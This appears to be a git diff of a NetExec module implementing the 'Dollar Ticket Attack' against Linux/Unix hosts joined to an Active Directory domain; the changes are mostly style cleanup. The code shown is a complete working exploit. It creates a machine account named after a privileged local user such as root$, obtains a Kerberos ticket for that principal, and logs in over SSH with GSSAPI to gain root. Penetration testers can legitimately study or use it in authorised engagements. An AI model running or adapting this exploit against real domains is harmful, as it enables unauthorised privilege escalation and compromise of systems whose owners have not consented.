@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 Dollar Ticket Attack Module for NetExec
 Automates privilege escalation on Linux/Unix domain-joined systems
@@ -9,10 +8,11 @@ Based on: https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack
 CVEs: CVE-2020-25717, CVE-2020-25719, CVE-2021-42287
 """
 
-import sys
-import subprocess
-import tempfile
+import contextlib
 import os
+import subprocess
+import sys
+import tempfile
 
 from impacket.dcerpc.v5 import samr, transport
 from impacket.ldap.ldap import LDAPSessionError
@@ -22,9 +22,9 @@ from nxc.helpers.misc import CATEGORY
 class NXCModule:
     """
     Exploits the Dollar Ticket Attack against Linux/Unix domain-joined targets
-    
+
     Creates a machine account with a privileged username (e.g., root$), then optionally
-    attempts to authenticate to the target via SSH using Kerberos GSSAPI. MIT Kerberos 
+    attempts to authenticate to the target via SSH using Kerberos GSSAPI. MIT Kerberos
     services strip the trailing '$' from machine accounts, allowing privilege escalation.
     """
 
@@ -35,42 +35,42 @@ class NXCModule:
     multiple_hosts = False
 
     def options(self, context, module_options):
-        """
+        r"""
         Dollar Ticket Attack options:
-        
+
         TARGET_USER     Local privileged user to impersonate (default: root)
         PASSWORD        Password for the machine account (default: random)
         METHOD          Creation method: SAMR or LDAPS (default: SAMR)
         SSH_TARGET      Target SSH host for automated exploitation (optional)
-        
+
         Usage examples:
             # Create machine account and get exploitation steps
             nxc smb $DC_IP -u Username -p Password -M dollar-ticket -o TARGET_USER=root
-            
+
             # With automated SSH exploitation
-            nxc smb $DC_IP -u Username -p Password -M dollar-ticket \\
+            nxc smb $DC_IP -u Username -p Password -M dollar-ticket \
                 -o TARGET_USER=root SSH_TARGET=192.168.1.50
-            
+
             # Use LDAPS method
-            nxc ldap $DC_IP -u Username -p Password -M dollar-ticket \\
+            nxc ldap $DC_IP -u Username -p Password -M dollar-ticket \
                 -o TARGET_USER=ubuntu METHOD=LDAPS SSH_TARGET=192.168.1.50
-        
+
         Cleanup (when done):
-            nxc smb $DC_IP -u Username -p Password -M add-computer \\
+            nxc smb $DC_IP -u Username -p Password -M add-computer \
                 -o NAME=root DELETE=True
         """
         self.target_user = module_options.get("TARGET_USER", "root")
         self.password = module_options.get("PASSWORD", self._generate_password())
         self.method = module_options.get("METHOD", "SAMR").upper()
         self.ssh_target = module_options.get("SSH_TARGET", None)
-        
+
         # Machine account name (without trailing $, added automatically)
         self.computer_name = self.target_user
         if self.computer_name.endswith("$"):
             self.computer_name = self.computer_name[:-1]
-        
+
         self.computer_name_full = f"{self.computer_name}$"
-        
+
         if self.method not in ["SAMR", "LDAPS"]:
             context.log.error("METHOD must be either SAMR or LDAPS")
             sys.exit(1)
@@ -79,15 +79,15 @@ class NXCModule:
         """Main execution flow"""
         self.context = context
         self.connection = connection
-        
+
         context.log.info(f"Starting Dollar Ticket Attack targeting local user '{self.target_user}'")
         context.log.info(f"Machine account to create: {self.computer_name_full}")
-        
+
         # Step 1: Create machine account
         success = self._create_machine_account()
         if not success:
             return
-        
+
         # Step 2: Attempt SSH exploitation if target specified
         if self.ssh_target:
             self._exploit_via_ssh()
@@ -97,7 +97,7 @@ class NXCModule:
     def _create_machine_account(self):
         """Create machine account via SAMR or LDAPS"""
         self.context.log.info(f"Creating machine account via {self.method}...")
-        
+
         if self.method == "SAMR" and self.connection.args.protocol == "smb":
             return self._create_via_samr()
         elif self.method == "LDAPS" and self.connection.args.protocol == "ldap":
@@ -112,40 +112,40 @@ class NXCModule:
         try:
             conn = self.connection
             rpc_transport = transport.SMBTransport(
-                conn.conn.getRemoteHost(), 
-                445, 
-                r"\samr", 
+                conn.conn.getRemoteHost(),
+                445,
+                r"\samr",
                 smb_connection=conn.conn
             )
-            
+
             dce = rpc_transport.get_dce_rpc()
             dce.connect()
             dce.bind(samr.MSRPC_UUID_SAMR)
-            
+
             # Open domain
             serv_handle = samr.hSamrConnect5(
-                dce, 
+                dce,
                 f"\\\\{conn.conn.getRemoteName()}\x00",
                 samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN
             )["ServerHandle"]
-            
+
             domains = samr.hSamrEnumerateDomainsInSamServer(dce, serv_handle)["Buffer"]["Buffer"]
             non_builtin = [d for d in domains if d["Name"].lower() != "builtin"]
-            
+
             if len(non_builtin) > 1:
                 matched = [d for d in domains if d["Name"].lower() == self.connection.domain.lower()]
                 selected = matched[0]["Name"] if matched else non_builtin[0]["Name"]
             else:
                 selected = non_builtin[0]["Name"]
-            
+
             domain_sid = samr.hSamrLookupDomainInSamServer(dce, serv_handle, selected)["DomainId"]
             domain_handle = samr.hSamrOpenDomain(
-                dce, 
-                serv_handle, 
-                samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, 
+                dce,
+                serv_handle,
+                samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER,
                 domain_sid
             )["DomainHandle"]
-            
+
             # Create computer account
             try:
                 request = samr.SamrCreateUser2InDomain()
@@ -154,28 +154,28 @@ class NXCModule:
                 request["AccountType"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                 request["DesiredAccess"] = samr.USER_FORCE_PASSWORD_CHANGE
                 user_handle = dce.request(request)["UserHandle"]
-                
+
                 # Set password
                 samr.hSamrSetPasswordInternal4New(dce, user_handle, self.password)
-                
+
                 # Set workstation trust account flag
                 user_rid = samr.hSamrLookupNamesInDomain(dce, domain_handle, [self.computer_name_full])["RelativeIds"]["Element"][0]
                 samr.hSamrCloseHandle(dce, user_handle)
                 user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)["UserHandle"]
-                
+
                 req = samr.SAMPR_USER_INFO_BUFFER()
                 req["tag"] = samr.USER_INFORMATION_CLASS.UserControlInformation
                 req["Control"]["UserAccountControl"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                 samr.hSamrSetInformationUser2(dce, user_handle, req)
-                
+
                 samr.hSamrCloseHandle(dce, user_handle)
                 samr.hSamrCloseHandle(dce, domain_handle)
                 samr.hSamrCloseHandle(dce, serv_handle)
-                
+
                 self.context.log.success(f"Created machine account: {self.computer_name_full}")
                 self.context.log.success(f"Password: {self.password}")
                 return True
-                
+
             except samr.DCERPCSessionError as e:
                 if "STATUS_USER_EXISTS" in str(e):
                     self.context.log.error(f"Machine account '{self.computer_name_full}' already exists")
@@ -186,15 +186,13 @@ class NXCModule:
                 else:
                     self.context.log.error(f"Error creating machine account: {e}")
                 return False
-                
+
         except Exception as e:
             self.context.log.error(f"SAMR operation failed: {e}")
             return False
         finally:
-            try:
+            with contextlib.suppress(Exception):
                 dce.disconnect()
-            except:
-                pass
 
     def _create_via_ldap(self):
         """Create machine account via LDAPS"""
@@ -203,14 +201,14 @@ class NXCModule:
             name = self.computer_name
             computer_dn = f"CN={name},CN=Computers,{self.connection.baseDN}"
             fqdn = f"{name}.{self.connection.domain}"
-            
+
             spns = [
                 f"HOST/{name}",
                 f"HOST/{fqdn}",
                 f"RestrictedKrbHost/{name}",
                 f"RestrictedKrbHost/{fqdn}",
             ]
-            
+
             ldap_conn.add(
                 computer_dn,
                 ["top", "person", "organizationalPerson", "user", "computer"],
@@ -222,11 +220,11 @@ class NXCModule:
                     "unicodePwd": f'"{self.password}"'.encode("utf-16-le"),
                 },
             )
-            
+
             self.context.log.success(f"Created machine account: {self.computer_name_full}")
             self.context.log.success(f"Password: {self.password}")
             return True
-            
+
         except LDAPSessionError as e:
             if "entryAlreadyExists" in str(e):
                 self.context.log.error(f"Machine account '{self.computer_name_full}' already exists")
@@ -241,24 +239,24 @@ class NXCModule:
     def _exploit_via_ssh(self):
         """Automated exploitation via SSH with Kerberos"""
         self.context.log.info(f"Attempting Kerberos authentication to {self.ssh_target}...")
-        
+
         # Check if kinit/klist are available
         if not self._check_kerberos_tools():
             self.context.log.error("Kerberos tools (kinit/klist) not found. Install krb5-user package.")
             self._provide_manual_steps()
             return
-        
+
         try:
             # Obtain TGT for the machine account principal (without $)
             # KDC will find root$ when root is requested
             self.context.log.info(f"Requesting TGT for principal '{self.target_user}'...")
-            
+
             # Create temporary krb5.conf with the domain
             krb5_conf = self._create_krb5_conf()
-            
+
             env = os.environ.copy()
             env["KRB5_CONFIG"] = krb5_conf
-            
+
             # Use echo to pipe password to kinit
             kinit_cmd = f"echo '{self.password}' | kinit {self.target_user}@{self.connection.domain.upper()}"
             result = subprocess.run(
@@ -269,14 +267,14 @@ class NXCModule:
                 text=True,
                 timeout=10
             )
-            
+
             if result.returncode != 0:
                 self.context.log.error(f"kinit failed: {result.stderr}")
                 self._provide_manual_steps()
                 return
-            
+
             self.context.log.success("TGT obtained successfully")
-            
+
             # Verify ticket
             klist_result = subprocess.run(
                 ["klist"],
@@ -284,16 +282,16 @@ class NXCModule:
                 capture_output=True,
                 text=True
             )
-            
+
             if self.target_user in klist_result.stdout or self.computer_name_full in klist_result.stdout:
                 self.context.log.info("Ticket cache contents:")
-                for line in klist_result.stdout.split('\n')[:5]:
+                for line in klist_result.stdout.split("\n")[:5]:
                     if line.strip():
                         self.context.log.info(f"  {line}")
-            
+
             # Attempt SSH with GSSAPI
             self.context.log.info(f"Attempting SSH to {self.ssh_target} as '{self.target_user}'...")
-            
+
             ssh_cmd = [
                 "ssh",
                 "-o", "PreferredAuthentications=gssapi-with-mic",
@@ -304,7 +302,7 @@ class NXCModule:
                 self.ssh_target,
                 "id"
             ]
-            
+
             ssh_result = subprocess.run(
                 ssh_cmd,
                 env=env,
@@ -312,9 +310,9 @@ class NXCModule:
                 text=True,
                 timeout=15
             )
-            
+
             if ssh_result.returncode == 0:
-                self.context.log.success(f"PRIVILEGE ESCALATION SUCCESSFUL!")
+                self.context.log.success("PRIVILEGE ESCALATION SUCCESSFUL!")
                 self.context.log.success(f"Authenticated as '{self.target_user}' on {self.ssh_target}")
                 self.context.log.success(f"Output: {ssh_result.stdout.strip()}")
                 self.context.log.info("")
@@ -328,16 +326,14 @@ class NXCModule:
                 self.context.log.error("  - PermitRootLogin is disabled")
                 self.context.log.error("  - GSSAPI authentication is disabled")
                 self._provide_manual_steps()
-            
+
             # Cleanup Kerberos ticket
             subprocess.run(["kdestroy"], env=env, capture_output=True)
-            
+
             # Remove temporary krb5.conf
-            try:
+            with contextlib.suppress(Exception):
                 os.unlink(krb5_conf)
-            except:
-                pass
-                
+
         except subprocess.TimeoutExpired:
             self.context.log.error("Operation timed out")
             self._provide_manual_steps()
@@ -405,8 +401,8 @@ class NXCModule:
     .{self.connection.domain.lower()} = {self.connection.domain.upper()}
     {self.connection.domain.lower()} = {self.connection.domain.upper()}
 """
-        
-        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.conf') as f:
+
+        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".conf") as f:
             f.write(krb5_content)
             return f.name
 
@@ -415,18 +411,18 @@ class NXCModule:
         """Generate a random complex password"""
         import random
         import string
-        
+
         chars = string.ascii_letters + string.digits + "!@#$%^&*"
-        password = ''.join(random.choice(chars) for _ in range(16))
-        
+        password = "".join(random.choice(chars) for _ in range(16))
+
         # Ensure complexity
         if not any(c.isupper() for c in password):
             password = password[0].upper() + password[1:]
         if not any(c.islower() for c in password):
             password = password[0].lower() + password[1:]
         if not any(c.isdigit() for c in password):
-            password = password[:-1] + '1'
+            password = password[:-1] + "1"
         if not any(c in "!@#$%^&*" for c in password):
-            password = password[:-1] + '!'
-        
+            password = password[:-1] + "!"
+
         return password
